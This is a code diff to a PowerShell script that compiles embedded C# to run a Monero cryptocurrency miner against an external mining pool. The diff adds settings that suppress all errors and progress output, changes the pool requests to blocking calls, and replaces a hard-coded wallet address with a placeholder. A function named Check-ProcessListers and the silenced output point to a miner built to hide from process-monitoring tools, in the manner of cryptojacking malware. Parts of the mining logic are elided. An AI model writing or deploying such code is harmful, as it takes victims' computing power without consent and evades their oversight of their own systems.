@@ -1,3 +1,6 @@
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
+
 function Write-Log {
     param (
         [string]$Message
@@ -17,6 +20,7 @@ function Invoke-MoneroMiner {
 
     $code = @"
 using System;
+using System.Net;
 using System.Net.Http;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading.Tasks;
@@ -43,8 +47,8 @@ namespace MoneroMiner
         {
             try
             {
-                var response = await this.client.GetAsync($"https://xmr.pool.minergate.com/xmr/{this.walletAddress}/{this.workerName}");
-                var content = await response.Content.ReadAsStringAsync();
+                var response = this.client.GetAsync($"https://xmr.pool.minergate.com/xmr/{this.walletAddress}/{this.workerName}").GetAwaiter().GetResult();
+                var content = response.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                 
                 // Parse and process mining data
                 // ...
@@ -113,7 +117,7 @@ function Check-ProcessListers {
 }
 
 function Start-Mining {
-    $walletAddress = "878rfYEi5WT32JwKXPmNSAi2S91WchiZnTsQbUPV9tUCR3ADEGTrTkZTu4exF6GiP6gqHFz4zZi5DE8V5jy2RYnLJvVwde6"
+    $walletAddress = "your_wallet_address"
     $workerName = "miner-" + (Get-Random -Maximum 1000000000000)
     $threads = 2
     
